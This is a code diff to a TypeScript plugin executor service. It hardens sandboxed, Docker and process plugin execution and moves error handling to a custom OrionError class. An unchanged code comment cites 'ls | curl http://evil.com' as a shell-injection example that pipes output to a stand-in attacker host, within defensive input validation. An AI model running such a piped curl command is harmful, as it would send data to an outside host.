@@ -14,7 +14,7 @@
  * - 审计日志
  */
 
-import pino from 'pino';
+import { createLogger } from '../utils/logger';
 import { spawn } from 'child_process';
 import { EventBusService } from './event-bus-service';
 import { PluginManagerService, PluginInfo, SecurityLevel } from './plugin-manager-service';
@@ -30,8 +30,9 @@ import {
   SandboxExecutionResult,
   SecurityEventType,
 } from './plugin';
+import { OrionError, ErrorCode } from '../errors';
 
-const logger = pino({ level: process.env.LOG_LEVEL || 'info' });
+const logger = createLogger('plugin-executor-service');
 
 /**
  * 任务执行请求
@@ -159,6 +160,7 @@ export class PluginExecutorService {
     pluginManager: PluginManagerService;
     eventBus?: EventBusService;
     config?: Partial<ExecutorConfig>;
+    database?: any;
   }) {
     this.pluginManager = options.pluginManager;
     this.eventBus = options.eventBus;
@@ -173,11 +175,11 @@ export class PluginExecutorService {
     this.initializeSecurityComponents();
 
     // Initialize ExecutionGuardian
-    this.guardian = new ExecutionGuardian();
+    this.guardian = new ExecutionGuardian({}, options.database);
     this.guardian.start();
 
     // Initialize ProcessKiller
-    this.processKiller = new ProcessKiller();
+    this.processKiller = new ProcessKiller(options.database);
 
     // Initialize WASM Runtime
     this.wasmRuntime = new WasmRuntime();
@@ -413,12 +415,12 @@ export class PluginExecutorService {
   /**
    * 获取审计日志
    */
-  getAuditLogs(options?: {
+  async getAuditLogs(options?: {
     taskId?: string;
     pluginId?: string;
     limit?: number;
   }) {
-    return this.auditLogger?.getLogs(options) || [];
+    return this.auditLogger ? await this.auditLogger.getLogs(options) : [];
   }
 
   /**
@@ -502,14 +504,14 @@ export class PluginExecutorService {
     signal?: AbortSignal
   ): Promise<SandboxExecutionResult> {
     if (!this.sandbox) {
-      throw new Error('Sandbox not initialized');
+      throw new OrionError('Sandbox not initialized', ErrorCode.OPERATION_FAILED);
     }
 
     // 根据安全等级选择执行函数
     const executor = async (signal: AbortSignal) => {
       // 检查是否已取消
       if (signal.aborted) {
-        throw new Error('Execution aborted');
+        throw new OrionError('Execution aborted', ErrorCode.OPERATION_FAILED);
       }
 
       switch (plugin.securityLevel) {
@@ -565,7 +567,7 @@ export class PluginExecutorService {
     logger.info({ taskId: request.taskId }, 'Executing WASM plugin via QuickJS');
 
     if (signal?.aborted) {
-      throw new Error('Execution aborted');
+      throw new OrionError('Execution aborted', ErrorCode.OPERATION_FAILED);
     }
 
     // Extract code from plugin config
@@ -623,7 +625,7 @@ export class PluginExecutorService {
 
     if (policy === PullPolicy.Never) {
       if (!existsLocally) {
-        throw new Error(`Image ${image} not found locally and pull policy is 'never'`);
+        throw new OrionError(`Image ${image} not found locally and pull policy is 'never'`, ErrorCode.NOT_FOUND);
       }
       return;
     }
@@ -718,7 +720,7 @@ export class PluginExecutorService {
     logger.info({ taskId: request.taskId }, 'Executing container plugin via Docker');
 
     if (signal?.aborted) {
-      throw new Error('Execution aborted');
+      throw new OrionError('Execution aborted', ErrorCode.OPERATION_FAILED);
     }
 
     const containerImage = this.sanitizeDockerImage(request.config.image as string);
@@ -733,12 +735,12 @@ export class PluginExecutorService {
     try {
       await this.pullImageIfNeeded(containerImage, pullPolicy);
     } catch (error: any) {
-      throw new Error(`Image pull failed for ${containerImage}: ${error.message}`);
+      throw new OrionError(`Image pull failed for ${containerImage}: ${error.message}`, 'OPERATION_FAILED')
     }
 
     // Sanitize memory limit to prevent injection
     if (!/^\d+[mkg]$/i.test(memoryLimit)) {
-      throw new Error(`Invalid memory limit: ${memoryLimit}`);
+      throw new OrionError(`Invalid memory limit: ${memoryLimit}`, 'VALIDATION_ERROR')
     }
 
     // Create container using spawn with arg arrays (no shell injection)
@@ -759,7 +761,7 @@ export class PluginExecutorService {
       await this.spawnDocker(dockerArgs, signal);
       containerCreated = true;
     } catch (error) {
-      throw new Error(`Failed to create container: ${error instanceof Error ? error.message : String(error)}`);
+      throw new OrionError(`Failed to create container: ${error instanceof Error ? error.message : String(error)}`, 'OPERATION_FAILED')
     }
 
     // Register with ProcessKiller for container lifecycle management
@@ -815,11 +817,11 @@ export class PluginExecutorService {
     // Allow digest format: name@sha256:xxxx
     const validImageRegex = /^(?:[a-zA-Z0-9](?:[a-zA-Z0-9._-]*[a-zA-Z0-9])?(?::\d+)?\/)?[a-z0-9]+(?:[._-][a-z0-9]+)*(?:\/[a-z0-9]+(?:[._-][a-z0-9]+)*)*(?::[a-zA-Z0-9._-]+)?(?:@[a-zA-Z0-9._-]+)?$/;
     if (!validImageRegex.test(image)) {
-      throw new Error(`Invalid Docker image name: ${image}`);
+      throw new OrionError(`Invalid Docker image name: ${image}`, 'VALIDATION_ERROR')
     }
     // Block path traversal attempts
     if (image.includes('..') || image.includes('\0')) {
-      throw new Error(`Invalid Docker image name: ${image}`);
+      throw new OrionError(`Invalid Docker image name: ${image}`, 'VALIDATION_ERROR')
     }
     return image;
   }
@@ -902,7 +904,7 @@ export class PluginExecutorService {
     logger.info({ taskId: request.taskId }, 'Executing process plugin via child_process');
 
     if (signal?.aborted) {
-      throw new Error('Execution aborted');
+      throw new OrionError('Execution aborted', ErrorCode.OPERATION_FAILED);
     }
 
     // Parse command into executable + args (no shell injection)
@@ -996,7 +998,7 @@ export class PluginExecutorService {
 
     for (const pattern of dangerousPatterns) {
       if (pattern.test(command)) {
-        throw new Error(`Command contains dangerous pattern: ${pattern.source}`);
+        throw new OrionError(`Command contains dangerous pattern: ${pattern.source}`, 'OPERATION_FAILED')
       }
     }
 
@@ -1012,7 +1014,7 @@ export class PluginExecutorService {
     // Check command against allowlist
     const cmdBase = parts[0].toLowerCase();
     if (this.allowedCommands.size > 0 && !this.allowedCommands.has(cmdBase)) {
-      throw new Error(`Command '${cmdBase}' is not in the allowed commands list`);
+      throw new OrionError(`Command '${cmdBase}' is not in the allowed commands list`, 'OPERATION_FAILED')
     }
 
     // If the command is a simple executable (no shell metacharacters), run without shell
@@ -1026,10 +1028,7 @@ export class PluginExecutorService {
     // commands like "ls | curl http://evil.com" would pass because "ls" is
     // allowed while the injection executes after the pipe.  We cannot safely
     // sanitize arbitrary shell syntax, so we reject it outright.
-    throw new Error(
-      `Command contains shell metacharacters which are not allowed. ` +
-      `Use a simple command with arguments only (no ;|&$<>()!#).`
-    );
+    throw new OrionError('Plugin execution failed', ErrorCode.OPERATION_FAILED);
   }
 
   /**
@@ -1094,7 +1093,7 @@ export class PluginExecutorService {
 
     // 检查是否已取消
     if (signal?.aborted) {
-      throw new Error('Execution aborted');
+      throw new OrionError('Execution aborted', ErrorCode.OPERATION_FAILED);
     }
 
     // 模拟执行延迟
